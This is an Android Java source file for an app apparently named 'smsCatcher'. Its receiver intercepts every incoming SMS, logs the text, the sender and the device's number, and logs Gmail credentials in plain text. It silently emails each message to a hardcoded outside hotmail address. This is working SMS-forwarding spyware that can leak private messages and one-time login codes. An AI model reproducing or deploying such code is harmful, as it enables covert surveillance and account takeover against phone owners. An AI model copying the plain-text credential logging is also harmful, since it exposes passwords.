package com.proje.smsCatcher;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

public class SMSReceiver extends BroadcastReceiver {

	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	public static String username;
	public static String password;

	@Override
	public void onReceive(Context context, Intent intent) {

		TelephonyManager tMgr = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);

		String mPhoneNumber = tMgr.getLine1Number();

		if (intent.getAction().equals(SMS_RECEIVED)) {
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				Object[] pdus = (Object[]) bundle.get("pdus");
				final SmsMessage[] messages = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				}
				if (messages.length > -1) {
					Log.i("sms geldi",
							"Mesaj body: " + messages[0].getMessageBody());
					Log.i("sms geldi",
							"from: " + messages[0].getOriginatingAddress());
					Log.i("sms geldi", "my number: " + mPhoneNumber);

					try {
						Log.d("Mail is tried to be sent!", username + " "
								+ password);
						GMailSender sender = new GMailSender(username, password);

						sender.sendMail(
								"SMS ALINDI",
								"From: " + messages[0].getOriginatingAddress()
										+ "\n" + "To: " + mPhoneNumber + "\n"
										+ "Message Contents : "
										+ messages[0].getMessageBody(),
								username, "pelinaribas@hotmail.com");

					} catch (Exception e) {
						Log.e("SendMail", e.getMessage(), e);
					}
				}
			}
		}

	}
}